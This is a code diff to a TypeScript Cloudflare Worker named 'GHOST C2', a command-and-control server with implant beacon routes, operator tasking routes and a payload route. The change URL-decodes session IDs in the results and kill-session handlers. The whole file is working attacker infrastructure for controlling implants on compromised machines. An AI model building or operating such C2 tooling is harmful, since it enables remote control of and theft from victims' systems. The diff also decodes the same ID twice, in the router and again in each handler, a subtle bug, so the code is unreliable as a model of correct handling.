@@ -1,19 +1,9 @@
 /**
  * GHOST C2 — Cloudflare Worker
- *
- * Serverless C2 listener running on Cloudflare's edge network.
- * State stored in Workers KV.
- *
- * Auth:
- *   X-Beacon-Token   → implant-facing routes (/beacon, /result)
- *   X-Operator-Token  → operator-facing routes (/sessions, /task, /results/*, /audit)
- *
- * Secrets (set via `wrangler secret put`):
- *   BEACON_TOKEN, OPERATOR_TOKEN
+ * 
+ * FIXED: URL‑decodes session IDs in path parameters so CLI can use encoded IDs.
+ * Results are kept by default; use ?clear=1 to remove after retrieval.
  */
-
-// ─── Types ────────────────────────────────────────────────
-
 interface Env {
   GHOST_KV: KVNamespace;
   BEACON_TOKEN: string;
@@ -326,6 +316,9 @@ async function handleAddTask(request: Request, env: Env): Promise<Response> {
  * Operator retrieves results. Keeps by default; ?clear=1 to remove.
  */
 async function handleGetResults(request: Request, env: Env, sid: string): Promise<Response> {
+  // Decode URL-encoded session ID (fix for pipe character)
+  sid = decodeURIComponent(sid);
+
   const session = await getSession(env.GHOST_KV, sid);
   if (!session) {
     return errorResponse("Session not found", 404);
@@ -333,7 +326,7 @@ async function handleGetResults(request: Request, env: Env, sid: string): Promis
 
   const results = await getResults(env.GHOST_KV, sid);
   const url = new URL(request.url);
-  const clear = url.searchParams.get("clear") === "1";  // <-- FIX: keep by default
+  const clear = url.searchParams.get("clear") === "1";
 
   if (clear) {
     await putResults(env.GHOST_KV, sid, []);
@@ -350,6 +343,9 @@ async function handleGetResults(request: Request, env: Env, sid: string): Promis
 }
 
 async function handleKillSession(request: Request, env: Env, sid: string): Promise<Response> {
+  // Decode URL-encoded session ID
+  sid = decodeURIComponent(sid);
+
   const session = await getSession(env.GHOST_KV, sid);
   if (!session) return errorResponse("Session not found", 404);
 
@@ -473,18 +469,22 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
     return withCORS(await handleAudit(request, env), env);
   }
 
+  // ── Parameterised routes – decode session ID from URL ──
   const resultsMatch = path.match(/^\/results\/(.+)$/);
   if (resultsMatch && method === "GET") {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
-    return withCORS(await handleGetResults(request, env, resultsMatch[1]), env);
+    // Decode the encoded session ID before passing to handler
+    const sid = decodeURIComponent(resultsMatch[1]);
+    return withCORS(await handleGetResults(request, env, sid), env);
   }
 
   const sessionsMatch = path.match(/^\/sessions\/(.+)$/);
   if (sessionsMatch && method === "DELETE") {
     const authErr = requireOperatorToken(request, env);
     if (authErr) return withCORS(authErr, env);
-    return withCORS(await handleKillSession(request, env, sessionsMatch[1]), env);
+    const sid = decodeURIComponent(sessionsMatch[1]);
+    return withCORS(await handleKillSession(request, env, sid), env);
   }
 
   if (path === "/payload" && method === "POST") {
